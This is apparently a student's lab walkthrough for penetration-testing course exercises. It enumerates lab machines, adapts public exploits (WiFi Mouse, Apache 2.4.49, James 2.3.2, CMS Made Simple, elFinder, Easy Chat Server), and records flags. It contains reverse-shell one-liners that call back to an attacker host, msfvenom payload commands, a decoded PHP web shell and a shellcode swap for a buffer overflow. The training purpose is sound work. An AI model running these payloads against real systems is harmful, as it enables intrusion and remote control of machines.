
# Public Exploits

1. Start and exploit the _PublicExploits01_ machine.

```bash
# Enumerate
sudo nmap -p- 192.168.198.10
	PORT    STATE SERVICE
	135/tcp open  msrpc
	139/tcp open  netbios-ssn
	445/tcp open  microsoft-ds

smbclient -L 192.168.198.10                                 
	Password for [WORKGROUP\kali]: <entered none>

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        offsec          Disk      
        Users           Disk   

# Connect to SMB share
smbclient //192.168.198.10/offsec
	dir Desktop
		flag.txt                            A       38  Sat Mar 16 15:30:41 2024
	get Desktop/flag.txt
		NT_STATUS_ACCESS_DENIED opening remote file \Desktop\flag.txt
	dir Downloads/
		7z2200-x64.exe                      A  1569243  Tue Jun 21 17:56:35 2022
		ccsetup601.exe                      A 49618184  Tue Jun 21 17:54:25 2022
		ChromeSetup.exe                     A  1414600  Tue Jun 21 17:53:48 2022
		desktop.ini                       AHS      282  Mon Jun 20 21:07:23 2022
		Firefox Installer.exe               A   348616  Tue Jun 21 17:52:08 2022
		MouseServer.exe                     A  3150224  Tue Jun 21 17:55:48 2022
		ZoomBackground.png                  A  4269990  Thu Jun 23 03:03:57 2022
```

Researching the files, MouseServer.exe is part of WiFi Mouse application

```bash
# Search for exploits
searchsploit "wifi mouse"
	--------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                             |  Path
	--------------------------------------------------------------------------- ---------------------------------
	WiFi Mouse 1.7.8.5 - Remote Code Execution                                 | windows/remote/49601.py
	WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                             | windows/remote/50972.py
	WiFi Mouse 1.8.3.2 - Remote Code Execution (RCE)                           | windows/remote/51072.py
	WiFiMouse 1.8.3.4 - Remote Code Execution (RCE)                            | windows/remote/51016.sh

# Copy to local folder
searchsploit -m 50972

# Inspect source code to determine safety and how it works

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o revshell.exe
# Host payload exe on http.server
# Open Listener tab
nc -nlvp 4444

# Run
python3 50972.py 192.168.198.10 192.168.45.171:80 revshell.exe
```

> Answer:  OS{b8eb34e322b040a22cab87dcbe1bd67e}



2. Start and exploit the _PublicExploits02_ machine.

```bash
# Enumerate
nmap -Pn 192.168.187.188 -n -v -p- --max-scan-delay=0
PORT   STATE SERVICE
	80/tcp open  http

nmap -sV 192.168.187.188 -p 80
	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.49 ((Unix))

# Search for payload
searchsploit apache 2.4
	Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)   | multiple/webapps/50383.sh

# Download
searchsploit -m 50383.sh

# Review code
# Copy/ paste example from code & replace with own command.  (for some reason wasn't working when I typed the entire command out myself)
	# Ex from code:   PoC.sh targets.txt /bin/sh whoami

./50383.sh targets.txt /bin/sh "cat /home/offsec/flag.txt"

# OR use a reverse shell using pipes
./50383.sh targets.txt /bin/sh "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.214 4444 >/tmp/f"
```

> Answer:  OS{e0d3cae709f265bc848e57aa5c325fc8}



3. **Capstone Exercise**: An exploitable server is running services on several ports on the exercise VM, _PublicExploits03_. Treat this like a real box and start by identifying what services are running. There is a local user _student_ on this box with the password _lab_. Exploit the vulnerable service and SSH to the box to read _flag.txt_ located in _/home/challenge/_

```bash
# Enumerate
nmap -Pn -n -v -p- 192.168.187.52 --max-scan-delay=0
	PORT      STATE SERVICE
	22/tcp    open  ssh
	32822/tcp open  unknown
	32823/tcp open  unknown
	32824/tcp open  unknown
	32825/tcp open  unknown
	32826/tcp open  unknown

# Attempt to version
nmap -sV 192.168.187.52 -p 22,32822,32823,32824,32825,32826
	PORT      STATE  SERVICE     VERSION
	22/tcp    open   ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
	32822/tcp open   james-admin JAMES Remote Admin 2.3.2
	32823/tcp open   nntp        JAMES nntpd (posting ok)
	32824/tcp open  pop3    JAMES pop3d 2.3.2
	32825/tcp open  smtp    JAMES smtpd 2.3.2
	32826/tcp open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	Service Info: Host: 8155ad2d5547; OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Search for an exploit
searchsploit james 2.3.2
	--------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                             |  Path
	--------------------------------------------------------------------------- ---------------------------------
	Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (M | linux/remote/48130.rb
	Apache James Server 2.3.2 - Remote Command Execution                       | linux/remote/35513.py
	Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) | linux/remote/50347.py
	--------------------------------------------------------------------------- ---------------------------------

# Copy exploit
searchsploit -m 35513.py

# Review code & edit:
	# Lines 18 & 19:  Swap payload types and enter in bash reverse shell one-liner
	payload = 'bash -i >& /dev/tcp/192.168.45.214/443 0>&1' # to exploit on any user
	#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root

	# Lines 36 - 38:  Update James default Admin port
	print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,32822))     # <- HERE

	# Lines 50 - 52:  Update James default SMTP port
	print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,32825))     # <- HERE


# Run exploit
python2.7 35513.py 192.168.187.52

# SSH in w/ student:lab user using discovered secondary SSH port
ssh student@192.168.187.52 -p 32826

# In Listener tab
OS{d4951cff60e71ec96f1673fe7a5df95c}
```

> Answer:  OS{d4951cff60e71ec96f1673fe7a5df95c}



# Web Exploits


2. **Capstone Exercise**: To put in practice what we learned so far, here is the full vulnerable CMS Made Simple. You recovered the credentials for the admin on this service who is the user _offsec_ with the password _lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ_. Use this information to exploit the service on VM 1 that is running on **hxxp://\[IP_ADDRESS]/cmsms** and read **/home/flag.txt** to solve this challenge.

- Enumerate
```bash
nmap -sCV 192.168.198.52
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 67:2f:bf:fe:a6:61:4d:13:68:62:e4:ab:d3:c9:8e:50 (RSA)
	|   256 7c:3c:8e:ea:64:48:2a:75:5b:86:c8:5d:d0:69:b1:fc (ECDSA)
	|_  256 74:48:13:a7:a2:97:bf:93:cc:21:e4:8e:9e:ef:20:ce (ED25519)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


feroxbuster -u http://192.168.198.52 -s 200
	[####################] - 2m     30000/30000   219/s   http://192.168.198.52/cmsms/ 
	[##################>-] - 3m     27410/30000   167/s   http://192.168.198.52/cmsms/tmp/ 
	[###################>] - 3m     29411/30000   179/s   http://192.168.198.52/cmsms/admin/ 
	[################>---] - 3m     24900/30000   152/s   http://192.168.198.52/cmsms/modules/ 
	[####################] - 2m     30000/30000   219/s   http://192.168.198.52/cmsms/lib/ 
	[###################>] - 3m     29990/30000   183/s   http://192.168.198.52/cmsms/doc/ 
	[####################] - 2m     30000/30000   230/s   http://192.168.198.52/cmsms/uploads/
	... 
```

- Navigate to 192.168.198.52/cmsms
![](e13.2.3_cms.png)
- Find exploit, verify, download
```bash
searchsploit "CMS Made Simple" 2.2.5
	--------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                             |  Path
	--------------------------------------------------------------------------- ---------------------------------
	CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution              | php/webapps/44976.py
	CMS Made Simple < 2.2.10 - SQL Injection                                   | php/webapps/46635.py
	--------------------------------------------------------------------------- ---------------------------------

searchsploit -p 44976               
	  Exploit: CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution
	      URL: https://www.exploit-db.com/exploits/44976
	     Path: /usr/share/exploitdb/exploits/php/webapps/44976.py
	    Codes: CVE-2018-1000094
	 Verified: True
	File Type: Python script, ASCII text executable
	Copied EDB-ID #44976's path to the clipboard

searchsploit -m 44976
```

- Adjust to fit
```python
# Line 12 - fix target IP
base_url = "http://192.168.198.52/cmsms/admin"
# Line 15 & 16 - Update creds
username = "offsec"
password = "lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ"
# Line 34 - Ignore SSL cert
response = requests.post(url, data=data, allow_redirects=False)  
# Line 55 - Ignore SSL cert
response = requests.post(url, data=data, files=txt, cookies=cookies)  
# Line 80 - Ignore SSL cert
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
```

IF error  is thrown:
`File "44976.py", line 25, in parse_csrf_token`
    `return location.split(csrf_param + "=")[1]`
Test csrf_param output by adding `print "[+] String being split: " + location` on Line *24*
Result will tell you which to use
`[+] String being split: http://192.168.198.52/cmsms/admin?_sk_=c865bd20b4d42fc0b84`

- Fix
```bash
# Line 18
csrf_param = "_sk_"
```

- Run & exploit
```bash
python2 44976.py
	[+] Authenticated successfully with the supplied credentials
	[+] String being split: http://192.168.198.52/cmsms/admin?_sk_=09032e5b656bb7393cd
	[*] Attempting to upload cmsmsrce.txt...
	[+] Successfully uploaded cmsmsrce.txt
	[*] Attempting to copy cmsmsrce.txt to shell.php...
	[+] File copied successfully
	[+] Exploit succeeded, shell can be found at: http://192.168.198.52/cmsms/uploads/shell.php

curl -k http://192.168.198.52/cmsms/uploads/shell.php?cmd=cat%20/home/flag.txt
	OS{579126dcf18692527ec0224ad0a4b9db}
```

> Answer:  OS{579126dcf18692527ec0224ad0a4b9db}





3. **Capstone Exercise**: The next VM, Module Exercise VM 2, is running a vulnerable version of the *elFinder* web application whose exploit is available . Once you've found the application base address through directory brute-forcing, modify the exploit to point to the correct application URL and get a shell. The flag can be found in the same folder. Note: Before running the exploit, remember to place a valid JPEG file on your local Kali machine and name it according to the exploit specifications.

- Enumerate
```bash
nmap -Pn 192.168.198.46
	PORT     STATE SERVICE
	22/tcp   open  ssh
	80/tcp   open  http
	3389/tcp open  ms-wbt-server

gobuster dir -u http://192.168.198.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
	/seclab               (Status: 301) [Size: 317] [--> http://192.168.198.46/seclab/]

feroxbuster -u http://192.168.198.46/seclab -s 200 -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -k -t 100
	200      GET       12l       12w      125c http://192.168.198.46/seclab/.gitignore
	200      GET       28l       61w      638c http://192.168.198.46/seclab/bower.json
	200      GET       39l       92w     1328c http://192.168.198.46/seclab/composer.json
	200      GET        0l        0w        0c http://192.168.198.46/seclab/files/.gitkeep
	200      GET       15l      232w     1525c http://192.168.198.46/seclab/LICENSE.md
	200      GET     1070l     7800w    55390c http://192.168.198.46/seclab/Changelog
	200      GET       13l       37w      427c http://192.168.198.46/seclab/package.json
	200      GET      217l      923w    10174c http://192.168.198.46/seclab/README.md
	200      GET        0l        0w        0c http://192.168.198.46/seclab/php/editors/editor.php
```

- Navigate to `http://198.168.198.46/seclab/README.md`
- It'll download.  Can review for elFinder version
- Search for exploit, verify, and download
```bash
searchsploit elFinder 2.1                  
	--------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                             |  Path
	--------------------------------------------------------------------------- ---------------------------------
	elFinder 2.1.47 - 'PHP connector' Command Injection                        | php/webapps/46481.py
	elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit | php/remote/46539.rb
	elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit | php/remote/46539.rb
	elFinder Web file manager Version - 2.1.53 Remote Command Execution        | php/webapps/51864.txt
	--------------------------------------------------------------------------- ---------------------------------

searchsploit -p 46481    
	  Exploit: elFinder 2.1.47 - 'PHP connector' Command Injection
	      URL: https://www.exploit-db.com/exploits/46481
	     Path: /usr/share/exploitdb/exploits/php/webapps/46481.py
	    Codes: CVE-2019-9194
	 Verified: True
	File Type: Python script, ASCII text executable
	Copied EDB-ID #46481's path to the clipboard

searchsploit -m 46481
```

- Understand the code
```python
# Line 27
payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'
```
- Used CyberChef to decode `3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a` w/ *From Hex*
	- code is:  `<?php system($_GET["c"]); ?>`
- Requires the URL to the elFinder base directory as the arg to the script
- Also looks like it requires a .JPEG file titled SecSignal.jpg for it to work
- Copy a sample .jpg file to pwd, test run, & exploit
```bash
cp /var/lib/inetsim/http/fakefiles/sample.jpg ./SecSignal.jpg

python2 46481.py http://192.168.198.46/seclab
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...
$ pwd
/var/www/http/seclab/php

$ find / -name flag.txt 2>/dev/null
/var/www/http/seclab/php/flag.txt

$ cat /var/www/http/seclab/php/flag.txt
OS{9a4337dd7581e44f7ebd5cb8de321d64}

```

> Answer:  OS{9a4337dd7581e44f7ebd5cb8de321d64}



4. **Capstone Exercise**: Enumerate the Module Exercise VM 3 and find the application that has a memory corruption vulnerability. Then find the related public exploit and fix it as illustrated in this Module.

- Enumerate
```bash
sudo nmap -Pn 192.168.198.213
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	20000/tcp open  dnp

sudo nmap -sCV 192.168.198.213 -p 135,139,445,20000
	PORT      STATE SERVICE       VERSION
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	20000/tcp open  http          Easy Chat Server httpd 1.0
	|_http-title: Easy Chat Server
	|_http-server-header: Easy Chat Server/1.0
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-time: 
	|   date: 2024-03-24T23:52:06
	|_  start_date: N/A
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required

# Search for exploit
searchsploit "Easy Chat Server"
	...
	Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)                  | windows/remote/50999.py
	...

# Download  <-- NOTE  Info says it fails verification, but *should* work
searchcsploit -m 50999
```

- Review code
	- Line *22* shows reverse shell code used

- Craft reverse shell & replace current shellcode Line *24* - *50*
	- Careful to not remove Line *23* - the nop slide.
```bash
# meterpreter shell was non-interactive.  Had to go with this one:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=4444 -f python -b "\x00\x20" -v shellcode
```

- Run to test
```
python2 50999.py 192.168.198.213 20000       
	[*] Sending evil buffer...
	[+] Done!
```

Once connection's made
```powershell
cd C:\
dir \s flag.txt
type C:\Users\Administrator\Desktop\flag.txt
```

> Answer:  OS{8d347bb15227fa41b7812927dd7df120}